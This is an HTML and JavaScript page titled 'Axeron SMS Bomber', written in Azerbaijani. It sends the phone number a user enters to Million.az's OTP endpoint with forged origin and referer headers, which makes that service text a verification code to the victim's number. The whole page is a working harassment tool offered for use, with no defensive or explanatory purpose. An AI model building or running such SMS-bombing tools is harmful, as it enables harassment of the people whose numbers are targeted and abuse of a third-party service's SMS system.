<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Axeron SMS Bomber | Panel</title>
    <style>
        * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { 
            background: #05070a; 
            color: white; 
            margin: 0; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
        }
        .container { 
            background: #11161d; 
            padding: 40px; 
            border-radius: 25px; 
            border: 1px solid #2d343f; 
            width: 90%; 
            max-width: 400px; 
            text-align: center;
            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
        }
        h1 { color: #00d2ff; font-size: 26px; margin-bottom: 10px; text-transform: uppercase; letter-spacing: 2px; }
        p { color: #8892b0; font-size: 14px; margin-bottom: 25px; }
        
        input { 
            width: 100%; 
            padding: 15px; 
            margin-bottom: 20px; 
            border-radius: 12px; 
            border: 1px solid #333; 
            background: #0a0c10; 
            color: white; 
            font-size: 18px; 
            text-align: center;
            outline: none;
            transition: 0.3s;
        }
        input:focus { border-color: #00d2ff; box-shadow: 0 0 10px rgba(0,210,255,0.2); }
        
        button { 
            width: 100%; 
            padding: 16px; 
            border-radius: 12px; 
            border: none; 
            background: #00d2ff; 
            color: #000; 
            font-weight: bold; 
            font-size: 16px; 
            cursor: pointer; 
            transition: 0.3s;
            text-transform: uppercase;
        }
        button:hover { background: #fff; transform: translateY(-2px); box-shadow: 0 5px 15px rgba(255,255,255,0.2); }
        
        #status { 
            margin-top: 25px; 
            font-size: 14px; 
            font-weight: bold; 
            padding: 10px;
            border-radius: 8px;
            min-height: 40px;
        }
        .footer { margin-top: 20px; font-size: 10px; color: #444; }
    </style>
</head>
<body>

<div class="container">
    <h1>AXERON SMS</h1>
    <p>Million.az üzərindən nömrəyə SMS göndər.</p>
    
    <input type="text" id="phoneNumber" placeholder="Məs: 0507654321" maxlength="13">
    <button onclick="runSmsLogic()">SMS Göndər</button>
    
    <div id="status"></div>
    <div class="footer">Developer by Axeron &copy; 2026</div>
</div>

<script>
    async function runSmsLogic() {
        const input = document.getElementById('phoneNumber').value;
        const status = document.getElementById('status');
        
        // 1. Nömrəni təmizlə (yalnız rəqəmlər)
        let clean = input.replace(/\D/g, '');

        // 2. 994 formatına sal (Sənin Python kodundakı məntiq)
        if (!clean.startsWith('994')) {
            if (clean.startsWith('0')) {
                clean = '994' + clean.substring(1);
            } else {
                clean = '994' + clean;
            }
        }

        if (clean.length < 12) {
            status.innerText = "⚠️ Nömrə səhvdir!";
            status.style.color = "#ffcc00";
            return;
        }

        status.innerText = "⏳ Sorğu göndərilir: " + clean;
        status.style.color = "#00d2ff";

        // 3. Million.az API-ya POST sorğusu
        try {
            const response = await fetch("https://api.million.az/api/auth/send-otp", {
                method: "POST",
                headers: {
                    "accept": "application/json, text/plain, */*",
                    "content-type": "application/json",
                    "origin": "https://www.million.az",
                    "referer": "https://www.million.az/"
                },
                body: JSON.stringify({ msisdn: clean })
            });

            if (response.ok) {
                status.innerText = "✅ UĞURLU! SMS kodu göndərildi.";
                status.style.color = "#00ff88";
            } else if (response.status === 429) {
                status.innerText = "❌ LİMİT: Çox sayda sorğu göndərilib.";
                status.style.color = "#ff4444";
            } else {
                const errorData = await response.text();
                status.innerText = "❌ Server xətası: " + response.status;
                status.style.color = "#ff4444";
                console.log(errorData);
            }
        } catch (error) {
            // Brauzer təhlükəsizliyi (CORS) bəzən bloklaya bilər
            status.innerText = "❌ Bağlantı bloklandı (CORS xətası).";
            status.style.color = "#ffcc00";
            console.error("Xəta:", error);
        }
    }
</script>

</body>
</html>
